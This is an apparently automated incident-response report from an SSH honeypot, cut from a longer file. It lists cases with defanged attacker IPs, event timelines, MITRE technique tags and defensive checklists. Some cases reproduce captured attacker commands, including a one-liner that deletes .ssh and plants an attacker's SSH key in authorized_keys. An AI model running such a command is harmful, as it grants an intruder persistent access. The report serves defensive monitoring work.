| `2026-11-08 03:19:04` | `cowrie.command.input` |
| `2026-11-08 03:19:04` | `cowrie.command.input` |
| `2026-11-08 03:19:04` | `cowrie.command.input` |
| `2026-11-08 03:19:04` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-067e072784a4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-08 03:20 |
| **Last Seen** | 2026-11-08 03:22 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_21119420f5be970ee2b0b9dc74d67d4f_small_control'"'"' '"'"'check_21119420f5be970ee2b0b9dc74d67d4f'"'"'', printf '\n%s|%s\n' 'check_21119420f5be970ee2b0b9dc74d67d4f_small_control' 'check_21119420f5be970ee2b0b9dc74d67d4f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_21119420f5be970ee2b0b9dc74d67d4f_small_math'"'"' "$((490*263+27))"', (490*263+27, printf '\n%s|%s\n' 'check_21119420f5be970ee2b0b9dc74d67d4f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:20:31` | `cowrie.session.connect` |
| `2026-11-08 03:20:32` | `cowrie.client.version` |
| `2026-11-08 03:20:32` | `cowrie.client.kex` |
| `2026-11-08 03:20:42` | `cowrie.login.success` |
| `2026-11-08 03:20:45` | `cowrie.client.size` |
| `2026-11-08 03:20:46` | `cowrie.session.params` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| `2026-11-08 03:20:47` | `cowrie.command.input` |
| … | _48 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-419b457109b6

| Field | Detail |
|---|---|
| **Source IP** | `118.145.239[.]187` |
| **First Seen** | 2026-11-08 03:48 |
| **Last Seen** | 2026-11-08 03:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:48:56` | `cowrie.session.connect` |
| `2026-11-08 03:48:56` | `cowrie.client.version` |
| `2026-11-08 03:48:56` | `cowrie.client.kex` |
| `2026-11-08 03:48:57` | `cowrie.login.success` |
| `2026-11-08 03:48:58` | `cowrie.session.params` |
| `2026-11-08 03:48:58` | `cowrie.command.input` |
| `2026-11-08 03:48:58` | `cowrie.command.failed` |
| `2026-11-08 03:48:58` | `cowrie.log.closed` |
| `2026-11-08 03:48:59` | `cowrie.session.params` |
| `2026-11-08 03:48:59` | `cowrie.command.input` |
| `2026-11-08 03:48:59` | `cowrie.session.file_download` |
| `2026-11-08 03:48:59` | `cowrie.log.closed` |
| `2026-11-08 03:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.239[.]187` to AbuseIPDB if not already reported
- [ ] Block `118.145.239[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624eebcc9c0f

| Field | Detail |
|---|---|
| **Source IP** | `118.145.239[.]187` |
| **First Seen** | 2026-11-08 03:48 |
| **Last Seen** | 2026-11-08 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:48:59` | `cowrie.session.connect` |
| `2026-11-08 03:48:59` | `cowrie.client.version` |
| `2026-11-08 03:49:00` | `cowrie.client.kex` |
| `2026-11-08 03:49:01` | `cowrie.login.success` |
| `2026-11-08 03:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.239[.]187` to AbuseIPDB if not already reported
- [ ] Block `118.145.239[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7689eac3ae7d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]153` |
| **First Seen** | 2026-11-08 04:00 |
| **Last Seen** | 2026-11-08 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:00:02` | `cowrie.session.connect` |
| `2026-11-08 04:00:02` | `cowrie.client.version` |
| `2026-11-08 04:00:02` | `cowrie.client.kex` |
| `2026-11-08 04:00:03` | `cowrie.login.success` |
| `2026-11-08 04:00:04` | `cowrie.session.params` |
| `2026-11-08 04:00:04` | `cowrie.command.input` |
| `2026-11-08 04:00:04` | `cowrie.log.closed` |
| `2026-11-08 04:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]153` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e283946771c8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-08 04:04 |
| **Last Seen** | 2026-11-08 04:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:04:55` | `cowrie.session.connect` |
| `2026-11-08 04:04:55` | `cowrie.client.version` |
| `2026-11-08 04:04:55` | `cowrie.client.kex` |
| `2026-11-08 04:04:56` | `cowrie.login.success` |
| `2026-11-08 04:04:56` | `cowrie.direct-tcpip.request` |
| `2026-11-08 04:04:56` | `cowrie.direct-tcpip.data` |
| `2026-11-08 04:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7c8e9f9ce8

| Field | Detail |
|---|---|
| **Source IP** | `8.216.15[.]166` |
| **First Seen** | 2026-11-08 04:10 |
| **Last Seen** | 2026-11-08 04:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:10:29` | `cowrie.session.connect` |
| `2026-11-08 04:10:29` | `cowrie.login.success` |
| `2026-11-08 04:10:29` | `cowrie.session.params` |
| `2026-11-08 04:10:29` | `cowrie.command.input` |
| `2026-11-08 04:10:29` | `cowrie.command.failed` |
| `2026-11-08 04:10:29` | `cowrie.command.input` |
| `2026-11-08 04:10:29` | `cowrie.command.failed` |
| `2026-11-08 04:10:29` | `cowrie.command.input` |
| `2026-11-08 04:10:32` | `cowrie.log.closed` |
| `2026-11-08 04:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.216.15[.]166` to AbuseIPDB if not already reported
- [ ] Block `8.216.15[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44bb5e53b64

| Field | Detail |
|---|---|
| **Source IP** | `193.187.110[.]160` |
| **First Seen** | 2026-11-08 04:15 |
| **Last Seen** | 2026-11-08 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:15:33` | `cowrie.session.connect` |
| `2026-11-08 04:15:33` | `cowrie.client.version` |
| `2026-11-08 04:15:33` | `cowrie.client.kex` |
| `2026-11-08 04:15:33` | `cowrie.login.success` |
| `2026-11-08 04:15:33` | `cowrie.direct-tcpip.request` |
| `2026-11-08 04:15:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-11-08 04:15:34` | `cowrie.direct-tcpip.data` |
| `2026-11-08 04:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.187.110[.]160` to AbuseIPDB if not already reported
- [ ] Block `193.187.110[.]160` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b68c0941925d

| Field | Detail |
|---|---|
| **Source IP** | `190.239.55[.]74` |
| **First Seen** | 2026-11-08 04:31 |
| **Last Seen** | 2026-11-08 04:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:31:59` | `cowrie.session.connect` |
| `2026-11-08 04:31:59` | `cowrie.client.version` |
| `2026-11-08 04:31:59` | `cowrie.client.kex` |
| `2026-11-08 04:31:59` | `cowrie.login.success` |
| `2026-11-08 04:32:00` | `cowrie.session.params` |
| `2026-11-08 04:32:00` | `cowrie.command.input` |
| `2026-11-08 04:32:00` | `cowrie.command.failed` |
| `2026-11-08 04:32:00` | `cowrie.log.closed` |
| `2026-11-08 04:32:01` | `cowrie.session.params` |
| `2026-11-08 04:32:01` | `cowrie.command.input` |
| `2026-11-08 04:32:01` | `cowrie.session.file_download` |
| `2026-11-08 04:32:01` | `cowrie.log.closed` |
| `2026-11-08 04:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.239.55[.]74` to AbuseIPDB if not already reported
- [ ] Block `190.239.55[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef68c97161b6

| Field | Detail |
|---|---|
| **Source IP** | `190.239.55[.]74` |
| **First Seen** | 2026-11-08 04:32 |
| **Last Seen** | 2026-11-08 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:32:01` | `cowrie.session.connect` |
| `2026-11-08 04:32:01` | `cowrie.client.version` |
| `2026-11-08 04:32:01` | `cowrie.client.kex` |
| `2026-11-08 04:32:02` | `cowrie.login.success` |
| `2026-11-08 04:32:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.239.55[.]74` to AbuseIPDB if not already reported
- [ ] Block `190.239.55[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e13597610b4

| Field | Detail |
|---|---|
| **Source IP** | `87.251.64[.]128` |
| **First Seen** | 2026-11-08 04:37 |
| **Last Seen** | 2026-11-08 04:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0[.]0 Safari/537.36, Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7, Accept-Encoding: gzip, deflate, br, Accept-Language: en-US,en;q=0.9, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:37:33` | `cowrie.session.connect` |
| `2026-11-08 04:37:33` | `cowrie.login.success` |
| `2026-11-08 04:37:34` | `cowrie.session.params` |
| `2026-11-08 04:37:34` | `cowrie.command.input` |
| `2026-11-08 04:37:34` | `cowrie.command.input` |
| `2026-11-08 04:37:34` | `cowrie.command.failed` |
| `2026-11-08 04:37:34` | `cowrie.command.input` |
| `2026-11-08 04:37:34` | `cowrie.command.failed` |
| `2026-11-08 04:37:34` | `cowrie.command.input` |
| `2026-11-08 04:37:34` | `cowrie.command.failed` |
| `2026-11-08 04:37:34` | `cowrie.command.input` |
| `2026-11-08 04:37:34` | `cowrie.command.failed` |
| `2026-11-08 04:37:34` | `cowrie.command.input` |
| `2026-11-08 04:37:34` | `cowrie.log.closed` |
| `2026-11-08 04:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.251.64[.]128` to AbuseIPDB if not already reported
- [ ] Block `87.251.64[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9d11a9f263

| Field | Detail |
|---|---|
| **Source IP** | `23.132.164[.]185` |
| **First Seen** | 2026-11-08 04:49 |
| **Last Seen** | 2026-11-08 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:49:37` | `cowrie.session.connect` |
| `2026-11-08 04:49:37` | `cowrie.client.version` |
| `2026-11-08 04:49:38` | `cowrie.client.kex` |
| `2026-11-08 04:49:38` | `cowrie.login.success` |
| `2026-11-08 04:49:39` | `cowrie.session.params` |
| `2026-11-08 04:49:39` | `cowrie.command.input` |
| `2026-11-08 04:49:39` | `cowrie.log.closed` |
| `2026-11-08 04:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.132.164[.]185` to AbuseIPDB if not already reported
- [ ] Block `23.132.164[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d05d09186590

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-11-08 04:51 |
| **Last Seen** | 2026-11-08 04:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 04:51:27` | `cowrie.session.connect` |
| `2026-11-08 04:51:27` | `cowrie.client.version` |
| `2026-11-08 04:51:27` | `cowrie.client.kex` |
| `2026-11-08 04:51:28` | `cowrie.login.success` |
| `2026-11-08 04:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (103) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-01c07470ff1d | HIGH | `103.42.74[.]124` | 2026-11-08 05:00 | Y | 19 | 2 | `T1021.004 · T1053.003 · T1057` |
| IR-8cd73c2eedd9 | HIGH | `180.93.193[.]100` | 2026-11-08 05:37 | Y | 2 | 0 | `T1078 · T1083` |
| IR-0b42c3540605 | HIGH | `45.79.115[.]134` | 2026-11-08 05:41 | Y | 0 | 0 | `T1078` |
| IR-7822bb83e9d4 | HIGH | `159.75.211[.]148` | 2026-11-08 05:57 | Y | 10 | 0 | `T1003.008 · T1059.004 · T1078` |
| IR-0a8edfdf70f5 | HIGH | `193.32.162[.]15` | 2026-11-08 06:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-efabe10da202 | HIGH | `45.79.172[.]21` | 2026-11-08 06:43 | Y | 3 | 0 | `T1078` |
| IR-e0b6d03843b4 | HIGH | `216.218.206[.]68` | 2026-11-08 07:16 | Y | 3 | 0 | `T1078` |
| IR-3ed3b0864838 | HIGH | `167.148.201[.]122` | 2026-11-08 07:19 | Y | 2 | 0 | `T1078` |
| IR-1d10a9ad5828 | HIGH | `176.53.159[.]196` | 2026-11-08 07:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea8b2ad7c840 | HIGH | `35.210.36[.]43` | 2026-11-08 07:29 | Y | 2 | 0 | `T1078` |
| IR-be9a0a18d70c | HIGH | `35.210.36[.]43` | 2026-11-08 07:29 | Y | 1 | 0 | `T1078` |
| IR-a8abf220aca6 | HIGH | `35.210.36[.]43` | 2026-11-08 07:29 | Y | 0 | 0 | `T1078` |
| IR-618679579c8f | HIGH | `8.163.69[.]40` | 2026-11-08 07:30 | Y | 10 | 0 | `T1003.008 · T1059.004 · T1078` |
| IR-7674521ce658 | HIGH | `35.210.70[.]39` | 2026-11-08 07:42 | Y | 2 | 0 | `T1078` |
| IR-bd5bbc41495a | HIGH | `35.210.70[.]39` | 2026-11-08 07:42 | Y | 1 | 0 | `T1078` |
| IR-25dbd19a2b97 | HIGH | `35.210.70[.]39` | 2026-11-08 07:42 | Y | 0 | 0 | `T1078` |
| IR-e34b06d0f31b | HIGH | `35.210.108[.]150` | 2026-11-08 08:06 | Y | 2 | 0 | `T1078` |
| IR-b3dc2cd5f954 | HIGH | `35.210.108[.]150` | 2026-11-08 08:06 | Y | 1 | 0 | `T1078` |
| IR-4b6a54167ec5 | HIGH | `35.210.108[.]150` | 2026-11-08 08:06 | Y | 0 | 0 | `T1078` |
| IR-ca93dc2d24fb | HIGH | `150.138.115[.]76` | 2026-11-08 08:08 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-43ee2fab191e | HIGH | `91.186.216[.]80` | 2026-11-08 08:21 | Y | 0 | 0 | `T1078` |
| IR-d1f9bfe4b541 | HIGH | `109.160.32[.]110` | 2026-11-08 09:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-30986b714c0d | HIGH | `176.53.159[.]196` | 2026-11-08 09:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-642873022886 | HIGH | `35.221.138[.]107` | 2026-11-08 09:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3005042c0080 | HIGH | `35.221.138[.]107` | 2026-11-08 09:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-56f2ef31e111 | HIGH | `46.6.124[.]199` | 2026-11-08 09:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5a354e96fec4 | HIGH | `46.6.124[.]199` | 2026-11-08 09:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9760044f9289 | HIGH | `203.190.153[.]90` | 2026-11-08 09:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a097c063fab0 | HIGH | `203.190.153[.]90` | 2026-11-08 09:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3c424d38e5c0 | HIGH | `173.249.63[.]116` | 2026-11-08 09:33 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-c61d096eee2b | HIGH | `109.160.32[.]110` | 2026-11-08 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8afb39eeee24 | HIGH | `92.218.123[.]69` | 2026-11-08 10:03 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-2fdf11a86272 | HIGH | `45.65.233[.]163` | 2026-11-08 10:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bd079d1147c1 | HIGH | `45.65.233[.]163` | 2026-11-08 10:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c1250ddf0f77 | HIGH | `36.134.96[.]76` | 2026-11-08 10:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-20b9ceddaa8f | HIGH | `36.134.96[.]76` | 2026-11-08 10:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea111bbc9f05 | HIGH | `66.116.241[.]89` | 2026-11-08 10:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f6a80eb26410 | HIGH | `66.116.241[.]89` | 2026-11-08 10:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ce61019c9534 | HIGH | `27.17.30[.]150` | 2026-11-08 10:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-107b043761f5 | HIGH | `27.17.30[.]150` | 2026-11-08 10:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-96dec0f2febd | HIGH | `77.239.124[.]146` | 2026-11-08 11:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c254c48d7551 | HIGH | `203.145.143[.]181` | 2026-11-08 11:04 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-b215f46ca003 | HIGH | `176.53.159[.]196` | 2026-11-08 11:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c501b6846ce4 | HIGH | `41.215.133[.]245` | 2026-11-08 11:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9b7becaf0c4f | HIGH | `41.215.133[.]245` | 2026-11-08 11:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0a173a1971e1 | HIGH | `165.154.147[.]69` | 2026-11-08 11:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cf1e22d56b45 | HIGH | `165.154.147[.]69` | 2026-11-08 11:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d2d770b6bfeb | HIGH | `109.160.32[.]167` | 2026-11-08 11:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-7d2efcc58b8c | HIGH | `109.160.32[.]167` | 2026-11-08 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-146945530d61 | HIGH | `77.239.124[.]146` | 2026-11-08 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-84da42363d23 | HIGH | `201.249.192[.]30` | 2026-11-08 12:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-17bd80da7c81 | HIGH | `201.249.192[.]30` | 2026-11-08 12:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e4320290e0ce | HIGH | `220.247.224[.]226` | 2026-11-08 12:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4a2380669031 | HIGH | `220.247.224[.]226` | 2026-11-08 12:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-250d8db1990d | HIGH | `190.129.122[.]12` | 2026-11-08 12:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-05fbb6141d40 | HIGH | `190.129.122[.]12` | 2026-11-08 12:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74bcf917f8fb | HIGH | `186.96.158[.]180` | 2026-11-08 12:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-11ee53da511a | HIGH | `186.121.233[.]2` | 2026-11-08 12:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d96436dd39a4 | HIGH | `186.96.158[.]180` | 2026-11-08 12:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-13c5253dff14 | HIGH | `186.121.233[.]2` | 2026-11-08 12:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-168258571630 | HIGH | `103.146.159[.]173` | 2026-11-08 12:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f76c72c3b115 | HIGH | `103.146.159[.]173` | 2026-11-08 12:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-43917565022c | HIGH | `181.188.148[.]74` | 2026-11-08 12:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bf5388f20d5d | HIGH | `181.188.148[.]74` | 2026-11-08 12:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-53e7a0ca96cb | HIGH | `181.188.172[.]6` | 2026-11-08 12:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2f6718d6c623 | HIGH | `181.188.172[.]6` | 2026-11-08 12:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4053ec8280f6 | HIGH | `45.172.153[.]100` | 2026-11-08 12:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-03954b47cf79 | HIGH | `45.172.153[.]100` | 2026-11-08 12:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a159c251f80 | HIGH | `41.220.30[.]130` | 2026-11-08 12:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3ed8056e1345 | HIGH | `41.220.30[.]130` | 2026-11-08 12:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e3b257f7cdb0 | HIGH | `124.207.165[.]138` | 2026-11-08 12:45 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-ab7c74fc888a | HIGH | `190.181.44[.]194` | 2026-11-08 12:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bd814d3367d8 | HIGH | `190.181.44[.]194` | 2026-11-08 12:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-81a0919523df | HIGH | `103.200.22[.]154` | 2026-11-08 12:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-66034b560b4d | HIGH | `103.200.22[.]154` | 2026-11-08 12:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d2e99621d87b | HIGH | `176.53.159[.]196` | 2026-11-08 13:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c9b159bdcef0 | HIGH | `195.178.110[.]227` | 2026-11-08 13:01 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9b9c59cfd46f | HIGH | `195.178.110[.]227` | 2026-11-08 13:03 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e6763dae5582 | HIGH | `195.178.110[.]227` | 2026-11-08 13:04 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4c10c7da9206 | HIGH | `195.178.110[.]227` | 2026-11-08 13:06 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-666941452c05 | HIGH | `195.178.110[.]227` | 2026-11-08 13:08 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
